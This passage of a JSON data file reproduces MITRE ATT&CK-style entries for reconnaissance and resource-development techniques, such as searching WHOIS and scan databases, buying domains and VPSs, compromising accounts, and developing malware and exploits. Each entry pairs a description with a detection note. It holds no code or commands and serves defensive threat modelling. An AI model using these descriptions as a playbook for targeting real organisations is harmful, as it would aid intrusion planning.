        "description": " \nBefore compromising a victim, adversaries may purchase technical information about victims that can be used during targeting. Information about victims may be available for purchase within reputable private sources and databases, such as paid subscriptions to feeds of scan databases or other data aggregation services. Adversaries may also purchase information from less-reputable sources such as dark web or cybercrime blackmarkets. \nAdversaries may purchase information about their already identified targets, or use purchased data to discover opportunities for successful breaches. Threat actors may gather various technical details from purchased data, including but not limited to employee contact information, credentials, or specifics regarding a victim’s infrastructure.  \nInformation from these sources may reveal opportunities for other forms of reconnaissance (ex:  Phishing for Information or  Search Open Websites/Domains ), establishing operational resources (ex:  Develop Capabilities or  Obtain Capabilities ), and/or initial access (ex:  External Remote Services or  Valid Accounts ).  ",
        "detection": "\nMuch of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.\n\n"
      },
      "T1596": {
        "name": "Search Open Technical Databases",
        "description": " \nBefore compromising a victim, adversaries may search freely available technical databases for information about victims that can be used during targeting. Information about victims may be available in online databases and repositories, such as registrations of domains/certificates as well as public collections of network data/artifacts gathered from traffic and/or scans.  \n \n \n \n \n \n \n\nAdversaries may search in different open databases depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex:  Phishing for Information or  Search Open Websites/Domains ), establishing operational resources (ex:  Acquire Infrastructure or  Compromise Infrastructure ), and/or initial access (ex:  External Remote Services or  Trusted Relationship ).  ",
        "detection": "\nMuch of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.\n\n"
      },
      "T1596.001": {
        "name": "DNS/Passive DNS",
        "description": " \nBefore compromising a victim, adversaries may search DNS data for information about victims that can be used during targeting. DNS information may include a variety of details, including registered name servers as well as records that outline addressing for a target’s subdomains, mail servers, and other hosts. \nAdversaries may search DNS data to gather actionable information. Threat actors can query nameservers for a target organization directly, or search through centralized repositories of logged DNS query responses (known as passive DNS).  \n \nAdversaries may also seek and target DNS misconfigurations/leaks that reveal information about internal networks. Information from these sources may reveal opportunities for other forms of reconnaissance (ex:  Search Victim-Owned Websites or  Search Open Websites/Domains ), establishing operational resources (ex:  Acquire Infrastructure or  Compromise Infrastructure ), and/or initial access (ex:  External Remote Services or  Trusted Relationship ).  ",
        "detection": "\nMuch of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.\n\n"
      },
      "T1596.002": {
        "name": "WHOIS",
        "description": " \nBefore compromising a victim, adversaries may search public WHOIS data for information about victims that can be used during targeting. WHOIS data is stored by regional Internet registries (RIR) responsible for allocating and assigning Internet resources such as domain names. Anyone can query WHOIS servers for information about a registered domain, such as assigned IP blocks, contact information, and DNS nameservers.  \n\nAdversaries may search WHOIS data to gather actionable information. Threat actors can use online resources or command-line utilities to pillage through WHOIS data for information about potential victims. Information from these sources may reveal opportunities for other forms of reconnaissance (ex:  Active Scanning or  Phishing for Information ), establishing operational resources (ex:  Acquire Infrastructure or  Compromise Infrastructure ), and/or initial access (ex:  External Remote Services or  Trusted Relationship ).  ",
        "detection": "\nMuch of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.\n\n"
      },
      "T1596.003": {
        "name": "Digital Certificates",
        "description": " \nBefore compromising a victim, adversaries may search public digital certificate data for information about victims that can be used during targeting. Digital certificates are issued by a certificate authority (CA) in order to cryptographically verify the origin of signed content. These certificates, such as those used for encrypted web traffic (HTTPS SSL/TLS communications), contain information about the registered organization such as name and location. \nAdversaries may search digital certificate data to gather actionable information. Threat actors can use online resources and lookup tools to harvest information about certificates.  \nDigital certificate data may also be available from artifacts signed by the organization (ex: certificates used from encrypted web traffic are served with content).  \nInformation from these sources may reveal opportunities for other forms of reconnaissance (ex:  Active Scanning or  Phishing for Information ), establishing operational resources (ex:  Develop Capabilities or  Obtain Capabilities ), and/or initial access (ex:  External Remote Services or  Trusted Relationship ).  ",
        "detection": "\nMuch of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.\n\n"
      },
      "T1596.004": {
        "name": "CDNs",
        "description": " \nBefore compromising a victim, adversaries may search content delivery network (CDN) data about victims that can be used during targeting. CDNs allow an organization to host content from a distributed, load balanced array of servers. CDNs may also allow organizations to customize content delivery based on the requestor’s geographical region. \nAdversaries may search CDN data to gather actionable information. Threat actors can use online resources and lookup tools to harvest information about content servers within a CDN. Adversaries may also seek and target CDN misconfigurations that leak sensitive information not intended to be hosted and/or do not have the same protection mechanisms (ex: login portals) as the content hosted on the organization’s website.  \nInformation from these sources may reveal opportunities for other forms of reconnaissance (ex:  Active Scanning or  Search Open Websites/Domains ), establishing operational resources (ex:  Acquire Infrastructure or  Compromise Infrastructure ), and/or initial access (ex:  Drive-by Compromise ).  ",
        "detection": "\nMuch of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.\n\n"
      },
      "T1596.005": {
        "name": "Scan Databases",
        "description": " \nBefore compromising a victim, adversaries may search within public scan databases for information about victims that can be used during targeting. Various online services continuously publish the results of Internet scans/surveys, often harvesting information such as active IP addresses, hostnames, open ports, certificates, and even server banners.  \n\nAdversaries may search scan databases to gather actionable information. Threat actors can use online resources and lookup tools to harvest information from these services. Adversaries may seek information about their already identified targets, or use these datasets to discover opportunities for successful breaches. Information from these sources may reveal opportunities for other forms of reconnaissance (ex:  Active Scanning or  Search Open Websites/Domains ), establishing operational resources (ex:  Develop Capabilities or  Obtain Capabilities ), and/or initial access (ex:  External Remote Services or  Exploit Public-Facing Application ).  ",
        "detection": "\nMuch of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.\n\n"
      },
      "T1593": {
        "name": "Search Open Websites/Domains",
        "description": " \nBefore compromising a victim, adversaries may search freely available websites and/or domains for information about victims that can be used during targeting. Information about victims may be available in various online sites, such as social media, new sites, or those hosting information about business operations such as hiring or requested/rewarded contracts.  \n \n \n\nAdversaries may search in different online sites depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex:  Phishing for Information or  Search Open Technical Databases ), establishing operational resources (ex:  Establish Accounts or  Compromise Accounts ), and/or initial access (ex:  External Remote Services or  Phishing ).  ",
        "detection": "\nMuch of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.\n\n"
      },
      "T1593.001": {
        "name": "Social Media",
        "description": " \nBefore compromising a victim, adversaries may search social media for information about victims that can be used during targeting. Social media sites may contain various information about a victim organization, such as business announcements as well as information about the roles, locations, and interests of staff. \nAdversaries may search in different social media sites depending on what information they seek to gather. Threat actors may passively harvest data from these sites, as well as use information gathered to create fake profiles/groups to elicit victim’s into revealing specific information (i.e.  Spearphishing Service ).  \nInformation from these sources may reveal opportunities for other forms of reconnaissance (ex:  Phishing for Information or  Search Open Technical Databases ), establishing operational resources (ex:  Establish Accounts or  Compromise Accounts ), and/or initial access (ex:  Spearphishing via Service ).  ",
        "detection": "\nMuch of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.\n\n"
      },
      "T1593.002": {
        "name": "Search Engines",
        "description": " \nBefore compromising a victim, adversaries may use search engines to collect information about victims that can be used during targeting. Search engine services typical crawl online sites to index context and may provide users with specialized syntax to search for specific keywords or specific types of content (i.e. filetypes).  \n \n\nAdversaries may craft various search engine queries depending on what information they seek to gather. Threat actors may use search engines to harvest general information about victims, as well as use specialized queries to look for spillages/leaks of sensitive information such as network details or credentials. Information from these sources may reveal opportunities for other forms of reconnaissance (ex:  Phishing for Information or  Search Open Technical Databases ), establishing operational resources (ex:  Establish Accounts or  Compromise Accounts ), and/or initial access (ex:  Valid Accounts or  Phishing ).  ",
        "detection": "\nMuch of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.\n\n"
      },
      "T1594": {
        "name": "Search Victim-Owned Websites",
        "description": " \nBefore compromising a victim, adversaries may search websites owned by the victim for information that can be used during targeting. Victim-owned websites may contain a variety of details, including names of departments/divisions, physical locations, and data about key employees such as names, roles, and contact info (ex:  Email Addresses ). These sites may also have details highlighting business operations and relationships.  \n\nAdversaries may search victim-owned websites to gather actionable information. Information from these sources may reveal opportunities for other forms of reconnaissance (ex:  Phishing for Information or  Search Open Technical Databases ), establishing operational resources (ex:  Establish Accounts or  Compromise Accounts ), and/or initial access (ex:  Trusted Relationship or  Phishing ).  ",
        "detection": "\nMonitor for suspicious network traffic that could be indicative of adversary reconnaissance, such as rapid successions of requests indicative of web crawling and/or large quantities of requests originating from a single source (especially if the source is known to be associated with an adversary). Analyzing web metadata may also reveal artifacts that can be attributed to potentially malicious activity, such as referer or user-agent string HTTP/S fields.\n\n"
      }
    }
  },
  "TA0042": {
    "name": "Resource Development",
    "description": "\nThe adversary is trying to establish resources they can use to support operations.Resource Development consists of techniques that involve adversaries creating, purchasing, or compromising/stealing resources that can be used to support targeting. Such resources include infrastructure, accounts, or capabilities. These resources can be leveraged by the adversary to aid in other phases of the adversary lifecycle, such as using purchased domains to support Command and Control, email accounts for phishing as a part of Initial Access, or stealing code signing certificates to help with Defense Evasion.\n",
    "technique": {
      "T1583": {
        "name": "Acquire Infrastructure",
        "description": " \nBefore compromising a victim, adversaries may buy, lease, or rent infrastructure that can be used during targeting. A wide variety of infrastructure exists for hosting and orchestrating adversary operations. Infrastructure solutions include physical or cloud servers, domains, and third-party web services.  \nAdditionally, botnets are available for rent or purchase. \nUse of these infrastructure solutions allows an adversary to stage, launch, and execute an operation. Solutions may help adversary operations blend in with traffic that is seen as normal, such as contact to third-party web services. Depending on the implementation, adversaries may use infrastructure that makes it difficult to physically tie back to them as well as utilize infrastructure that can be rapidly provisioned, modified, and shut down.  ",
        "detection": "\nConsider use of services that may aid in tracking of newly acquired infrastructure, such as WHOIS databases for domain registration information. Much of this activity may take place outside the visibility of the target organization, making detection of this behavior difficult.Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control.\n\n"
      },
      "T1583.001": {
        "name": "Domains",
        "description": " \nBefore compromising a victim, adversaries may purchase domains that can be used during targeting. Domain names are the human readable names used to represent one or more IP addresses. They can be purchased or, in some cases, acquired for free. \nAdversaries can use purchased domains for a variety of purposes, including for  Phishing ,  Drive-by Compromise , and Command and Control.  \nAdversaries may choose domains that are similar to legitimate domains, including through use of homoglyphs or use of a different top-level domain (TLD).  \n \nTyposquatting may be used to aid in delivery of payloads via  Drive-by Compromise . Adversaries can also use internationalized domain names (IDNs) to create visually similar lookalike domains for use in operations.  \n\nDomain registrars each maintain a publicly viewable database that displays contact information for every registered domain. Private WHOIS services display alternative information, such as their own company data, rather than the owner of the domain. Adversaries may use such private WHOIS services to obscure information about who owns a purchased domain. Adversaries may further interrupt efforts to track their infrastructure by using varied registration information and purchasing domains with different domain registrars.  \n ",
        "detection": "\nDomain registration information is, by design, captured in public registration logs. Consider use of services that may aid in tracking of newly acquired domains, such as WHOIS databases and/or passive DNS. In some cases it may be possible to pivot on known pieces of domain registration information to uncover other infrastructure purchased by the adversary. Consider monitoring for domains created with a similar structure to your own, including under a different TLD. Though various tools and services exist to track, query, and monitor domain name registration information, tracking across multiple DNS infrastructures can require multiple tools/services or more advanced analytics.Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access and Command and Control.\n\n"
      },
      "T1583.002": {
        "name": "DNS Server",
        "description": " \nBefore compromising a victim, adversaries may set up their own Domain Name System (DNS) servers that can be used during targeting. During post-compromise activity, adversaries may utilize DNS traffic for various tasks, including for Command and Control (ex:  Application Layer Protocol ). Instead of hijacking existing DNS servers, adversaries may opt to configure and run their own DNS servers in support of operations. \nBy running their own DNS servers, adversaries can have more control over how they administer server-side DNS C2 traffic (  DNS ). With control over a DNS server, adversaries can configure DNS applications to provide conditional responses to malware and, generally, have more flexibility in the structure of the DNS-based C2 channel.  \n ",
        "detection": "\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control.\n\n"
      },
      "T1583.003": {
        "name": "Virtual Private Server",
        "description": " \nBefore compromising a victim, adversaries may rent Virtual Private Servers (VPSs) that can be used during targeting. There exist a variety of cloud service providers that will sell virtual machines/containers as a service. By utilizing a VPS, adversaries can make it difficult to physically tie back operations to them. The use of cloud infrastructure can also make it easier for adversaries to rapidly provision, modify, and shut down their infrastructure. \nAcquiring a VPS for use in later stages of the adversary lifecycle, such as Command and Control, can allow adversaries to benefit from the ubiquity and trust associated with higher reputation cloud service providers. Adversaries may also acquire infrastructure from VPS service providers that are known for renting VPSs with minimal registration information, allowing for more anonymous acquisitions of infrastructure.  \n ",
        "detection": "\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control.\n\n"
      },
      "T1583.004": {
        "name": "Server",
        "description": " \nBefore compromising a victim, adversaries may buy, lease, or rent physical servers that can be used during targeting. Use of servers allows an adversary to stage, launch, and execute an operation. During post-compromise activity, adversaries may utilize servers for various tasks, including for Command and Control. Instead of compromising a third-party  Server or renting a  Virtual Private Server , adversaries may opt to configure and run their own servers in support of operations. \nAdversaries may only need a lightweight setup if most of their activities will take place using online infrastructure. Or, they may need to build extensive infrastructure if they want to test, communicate, and control other aspects of their activities on their own systems.  \n ",
        "detection": "\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control.\n\n"
      },
      "T1583.005": {
        "name": "Botnet",
        "description": " \nBefore compromising a victim, adversaries may buy, lease, or rent a network of compromised systems that can be used during targeting. A botnet is a network of compromised systems that can be instructed to perform coordinated tasks.  \nAdversaries may purchase a subscription to use an existing botnet from a booter/stressor service. With a botnet at their disposal, adversaries may perform follow-on activity such as large-scale  Phishing or Distributed Denial of Service (DDoS).  \n \n \n \n ",
        "detection": "\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Phishing, Endpoint Denial of Service, or Network Denial of Service.\n\n"
      },
      "T1583.006": {
        "name": "Web Services",
        "description": " \nBefore compromising a victim, adversaries may register for web services that can be used during targeting. A variety of popular websites exist for adversaries to register for a web-based service that can be abused during later stages of the adversary lifecycle, such as during Command and Control (  Web Service ) or  Exfiltration Over Web Service . Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. By utilizing a web service, adversaries can make it difficult to physically tie back operations to them.  ",
        "detection": "\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control (Web Service) or Exfiltration Over Web Service.\n\n"
      },
      "T1586": {
        "name": "Compromise Accounts",
        "description": " \nBefore compromising a victim, adversaries may compromise accounts with services that can be used during targeting. For operations incorporating social engineering, the utilization of an online persona may be important. Rather than creating and cultivating accounts (i.e.  Establish Accounts ), adversaries may compromise existing accounts. Utilizing an existing persona may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona. \nA variety of methods exist for compromising accounts, such as gathering credentials via  Phishing for Information , purchasing credentials from third-party sites, or by brute forcing credentials (ex: password reuse from breach credential dumps).  \nPrior to compromising accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation. \nPersonas may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, Google, etc.). Compromised accounts may require additional development, this could include filling out or modifying profile information, further developing social networks, or incorporating photos. \nAdversaries may directly leverage compromised email accounts for  Phishing for Information or  Phishing .  ",
        "detection": "\nConsider monitoring social media activity related to your organization. Suspicious activity may include personas claiming to work for your organization or recently modified accounts making numerous connection requests to accounts affiliated with your organization.Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access (ex: Phishing).\n\n"
      },
      "T1586.001": {
        "name": "Social Media Accounts",
        "description": " \nBefore compromising a victim, adversaries may compromise social media accounts that can be used during targeting. For operations incorporating social engineering, the utilization of an online persona may be important. Rather than creating and cultivating social media profiles (i.e.  Social Media Accounts ), adversaries may compromise existing social media accounts. Utilizing an existing persona may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona. \nA variety of methods exist for compromising social media accounts, such as gathering credentials via  Phishing for Information , purchasing credentials from third-party sites, or by brute forcing credentials (ex: password reuse from breach credential dumps).  \nPrior to compromising social media accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation. \nPersonas may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, etc.). Compromised social media accounts may require additional development, this could include filling out or modifying profile information, further developing social networks, or incorporating photos. \nAdversaries can use a compromised social media profile to create new, or hijack existing, connections to targets of interest. These connections may be direct or may include trying to connect through others.  \n \nCompromised profiles may be leveraged during other phases of the adversary lifecycle, such as during Initial Access (ex:  Spearphishing via Service ).  ",
        "detection": "\nConsider monitoring social media activity related to your organization. Suspicious activity may include personas claiming to work for your organization or recently modified accounts making numerous connection requests to accounts affiliated with your organization.Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access (ex: Spearphishing via Service).\n\n"
      },
      "T1586.002": {
        "name": "Email Accounts",
        "description": " \nBefore compromising a victim, adversaries may compromise email accounts that can be used during targeting. Adversaries can use compromised email accounts to further their operations, such as leveraging them to conduct  Phishing for Information or  Phishing . Utilizing an existing persona with a compromised email account may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona. Compromised email accounts can also be used in the acquisition of infrastructure (ex:  Domains ). \nA variety of methods exist for compromising email accounts, such as gathering credentials via  Phishing for Information , purchasing credentials from third-party sites, or by brute forcing credentials (ex: password reuse from breach credential dumps).  \nPrior to compromising email accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation. \nAdversaries can use a compromised email account to hijack existing email threads with targets of interest.  ",
        "detection": "\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access (ex: Phishing).\n\n"
      },
      "T1584": {
        "name": "Compromise Infrastructure",
        "description": " \nBefore compromising a victim, adversaries may compromise third-party infrastructure that can be used during targeting. Infrastructure solutions include physical or cloud servers, domains, and third-party web services. Instead of buying, leasing, or renting infrastructure an adversary may compromise infrastructure and use it during other phases of the adversary lifecycle.  \n \n \n \nAdditionally, adversaries may compromise numerous machines to form a botnet they can leverage. \nUse of compromised infrastructure allows an adversary to stage, launch, and execute an operation. Compromised infrastructure can help adversary operations blend in with traffic that is seen as normal, such as contact with high reputation or trusted sites. By using compromised infrastructure, adversaries may make it difficult to tie their actions back to them. Prior to targeting, adversaries may compromise the infrastructure of other adversaries.  \n ",
        "detection": "\nMuch of this activity will take place outside the visibility of the target organization, making detection difficult for defenders. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control.\n\n"
      },
      "T1584.001": {
        "name": "Domains",
        "description": " \nBefore compromising a victim, adversaries may hijack domains and/or subdomains that can be used during targeting. Domain registration hijacking is the act of changing the registration of a domain name without the permission of the original registrant.  \nAn adversary may gain access to an email account for the person listed as the owner of the domain. The adversary can then claim that they forgot their password in order to make changes to the domain registration. Other possibilities include social engineering a domain registration help desk to gain access to an account or taking advantage of renewal process gaps. \nSubdomain hijacking can occur when organizations have DNS entries that point to non-existent or deprovisioned resources. In such cases, an adversary may take control of a subdomain to conduct operations with the benefit of the trust associated with that domain.  \n ",
        "detection": "\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control.\n\n"
      },
      "T1584.002": {
        "name": "DNS Server",
        "description": " \nBefore compromising a victim, adversaries may compromise third-party DNS servers that can be used during targeting. During post-compromise activity, adversaries may utilize DNS traffic for various tasks, including for Command and Control (ex:  Application Layer Protocol ). Instead of setting up their own DNS servers, adversaries may compromise third-party DNS servers in support of operations. \nBy compromising DNS servers, adversaries can alter DNS records. Such control can allow for redirection of an organization's traffic, facilitating Collection and Credential Access efforts for the adversary.  \n \nAdversaries may also be able to silently create subdomains pointed at malicious servers without tipping off the actual owner of the DNS server.  \n \n ",
        "detection": "\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control.\n\n"
      },
      "T1584.003": {
        "name": "Virtual Private Server",
        "description": " \nBefore compromising a victim, adversaries may compromise third-party Virtual Private Servers (VPSs) that can be used during targeting. There exist a variety of cloud service providers that will sell virtual machines/containers as a service. Adversaries may compromise VPSs purchased by third-party entities. By compromising a VPS to use as infrastructure, adversaries can make it difficult to physically tie back operations to themselves.  \n\nCompromising a VPS for use in later stages of the adversary lifecycle, such as Command and Control, can allow adversaries to benefit from the ubiquity and trust associated with higher reputation cloud service providers as well as that added by the compromised third-party.  ",
        "detection": "\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control.\n\n"
      },
      "T1584.004": {
        "name": "Server",
        "description": " \nBefore compromising a victim, adversaries may compromise third-party servers that can be used during targeting. Use of servers allows an adversary to stage, launch, and execute an operation. During post-compromise activity, adversaries may utilize servers for various tasks, including for Command and Control. Instead of purchasing a  Server or  Virtual Private Server , adversaries may compromise third-party servers in support of operations. \nAdversaries may also compromise web servers to support watering hole operations, as in  Drive-by Compromise .  ",
        "detection": "\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control.\n\n"
      },
      "T1584.005": {
        "name": "Botnet",
        "description": " \nBefore compromising a victim, adversaries may compromise numerous third-party systems to form a botnet that can be used during targeting. A botnet is a network of compromised systems that can be instructed to perform coordinated tasks.  \nInstead of purchasing/renting a botnet from a booter/stressor service  \n, adversaries may build their own botnet by compromising numerous third-party systems. Adversaries may also conduct a takeover of an existing botnet, such as redirecting bots to adversary-controlled C2 servers.  \nWith a botnet at their disposal, adversaries may perform follow-on activity such as large-scale  Phishing or Distributed Denial of Service (DDoS).  ",
        "detection": "\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Phishing, Endpoint Denial of Service, or Network Denial of Service.\n\n"
      },
      "T1584.006": {
        "name": "Web Services",
        "description": " \nBefore compromising a victim, adversaries may compromise access to third-party web services that can be used during targeting. A variety of popular websites exist for legitimate users to register for web-based services, such as GitHub, Twitter, Dropbox, Google, etc. Adversaries may try to take ownership of a legitimate user's access to a web service and use that web service as infrastructure in support of cyber operations. Such web services can be abused during later stages of the adversary lifecycle, such as during Command and Control (  Web Service ) or  Exfiltration Over Web Service .  \nUsing common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. By utilizing a web service, particularly when access is stolen from legitimate users, adversaries can make it difficult to physically tie back operations to them.  ",
        "detection": "\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control (Web Service) or Exfiltration Over Web Service.\n\n"
      },
      "T1587": {
        "name": "Develop Capabilities",
        "description": " \nBefore compromising a victim, adversaries may build capabilities that can be used during targeting. Rather than purchasing, freely downloading, or stealing capabilities, adversaries may develop their own capabilities in-house. This is the process of identifying development requirements and building solutions such as malware, exploits, and self-signed certificates. Adversaries may develop capabilities to support their operations throughout numerous phases of the adversary lifecycle.  \n \n \n \n\nAs with legitimate development efforts, different skill sets may be required for developing capabilities. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's development capabilities, provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the capability.  ",
        "detection": "\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Defense Evasion or Command and Control.\n\n"
      },
      "T1587.001": {
        "name": "Malware",
        "description": " \nBefore compromising a victim, adversaries may develop malware and malware components that can be used during targeting. Building malicious software can include the development of payloads, droppers, post-compromise tools, backdoors, packers, C2 protocols, and the creation of infected removable media. Adversaries may develop malware to support their operations, creating a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.  \n \n \n \n\nAs with legitimate development efforts, different skill sets may be required for developing malware. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's malware development capabilities, provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the malware. \nSome aspects of malware development, such as C2 protocol development, may require adversaries to obtain additional infrastructure. For example, malware developed that will communicate with Twitter for C2, may require use of  Web Services .  \n ",
        "detection": "\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on post-compromise phases of the adversary lifecycle.\n\n"
      },
      "T1587.002": {
        "name": "Code Signing Certificates",
        "description": " \nBefore compromising a victim, adversaries may create self-signed code signing certificates that can be used during targeting. Code signing is the process of digitally signing executables and scripts to confirm the software author and guarantee that the code has not been altered or corrupted. Code signing provides a level of authenticity for a program from the developer and a guarantee that the program has not been tampered with.  \nUsers and/or security tools may trust a signed piece of code more than an unsigned piece of code even if they don't know who issued the certificate or who the author is. \nPrior to  Code Signing , adversaries may develop self-signed code signing certificates for use in operations.  ",
        "detection": "\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related follow-on behavior, such as Code Signing or Install Root Certificate.\n\n"
      },
      "T1587.003": {
        "name": "Digital Certificates",
        "description": " \nBefore compromising a victim, adversaries may create self-signed SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are designed to instill trust. They include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate with its owner. In the case of self-signing, digital certificates will lack the element of trust associated with the signature of a third-party certificate authority (CA). \nAdversaries may create self-signed SSL/TLS certificates that can be used to further their operations, such as encrypting C2 traffic (ex:  Web Protocols ) or even enabling  Man-in-the-Middle if added to the root of trust (i.e.  Install Root Certificate ).  ",
        "detection": "\nConsider use of services that may aid in the tracking of certificates in use on sites across the Internet. In some cases it may be possible to pivot on known pieces of certificate information to uncover other adversary infrastructure. Detection efforts may be focused on related behaviors, such as Web Protocols, Asymmetric Cryptography, and/or Install Root Certificate.\n\n"
      },
      "T1587.004": {
        "name": "Exploits",
        "description": " \nBefore compromising a victim, adversaries may develop exploits that can be used during targeting. An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. Rather than finding/modifying exploits from online or purchasing them from exploit vendors, an adversary may develop their own exploits.  \nAdversaries may use information acquired via  Vulnerabilities to focus exploit development efforts. As part of the exploit development process, adversaries may uncover exploitable vulnerabilities through methods such as fuzzing and patch analysis.  \n\nAs with legitimate development efforts, different skill sets may be required for developing exploits. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's exploit development capabilities, provided the adversary plays a role in shaping requirements and maintains an initial degree of exclusivity to the exploit. \nAdversaries may use exploits during various phases of the adversary lifecycle (i.e.  Exploit Public-Facing Application ,  Exploitation for Client Execution ,  Exploitation for Privilege Escalation ,  Exploitation for Defense Evasion ,  Exploitation for Credential Access ,  Exploitation of Remote Services , and  Application or System Exploitation ).  ",
        "detection": "\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on behaviors relating to the use of exploits (i.e. Exploit Public-Facing Application, Exploitation for Client Execution, Exploitation for Privilege Escalation, Exploitation for Defense Evasion, Exploitation for Credential Access, Exploitation of Remote Services, and Application or System Exploitation).\n\n"
      },
      "T1585": {
        "name": "Establish Accounts",
        "description": " \nBefore compromising a victim, adversaries may create and cultivate accounts with services that can be used during targeting. Adversaries can create accounts that can be used to build a persona to further operations. Persona development consists of the development of public information, presence, history and appropriate affiliations. This development could be applied to social media, website, or other publicly available information that could be referenced and scrutinized for legitimacy over the course of an operation using that persona or identity.  \n \n\nFor operations incorporating social engineering, the utilization of an online persona may be important. These personas may be fictitious or impersonate real people. The persona may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, Google, etc.). Establishing a persona may require development of additional documentation to make them seem real. This could include filling out profile information, developing social networks, or incorporating photos.  \n \n\nEstablishing accounts can also include the creation of accounts with email providers, which may be directly leveraged for  Phishing for Information or  Phishing .  \n ",
        "detection": "\nConsider monitoring social media activity related to your organization. Suspicious activity may include personas claiming to work for your organization or recently created/modified accounts making numerous connection requests to accounts affiliated with your organization.Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access (ex: Phishing).\n\n"
      },
      "T1585.001": {
        "name": "Social Media Accounts",
